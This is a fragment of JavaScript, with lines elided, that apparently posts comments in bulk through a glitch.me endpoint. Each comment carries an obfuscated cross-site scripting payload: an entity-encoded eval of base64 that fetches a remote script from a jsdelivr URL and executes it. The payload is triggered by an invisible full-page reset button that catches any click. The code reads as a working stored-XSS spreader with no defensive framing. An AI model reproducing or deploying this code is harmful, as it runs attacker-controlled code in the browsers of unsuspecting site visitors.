...
async function fetchAndPost(quantity) {
    try {
        for (let i = 0; i < quantity; i++) {
            const commentString = `<form/onreset="ev&#97;l(&#97;tob('ZmV0Y2goJ2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9zZGFya3NpZS8xMUBtYWluLzEuanMnKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGV2YWwp'))"><input style	="position: fixed; inset: 0; z-index: 9999999; width: 100vw; height: 100vh; background: transparent; color: transparent; border: none;" type=reset>.`;
            
            // Step 1: Fetch the counter URL asynchronously
            const counterResponse = await fetch('https://zips.glitch.me/');
            ...
            if (postRequest.status < 400 || postRequest.status >= 500) {
                ...
                const additionalPostRequest = await fetch('https://zips.glitch.me/', {
                    method: 'POST',
                    headers: {
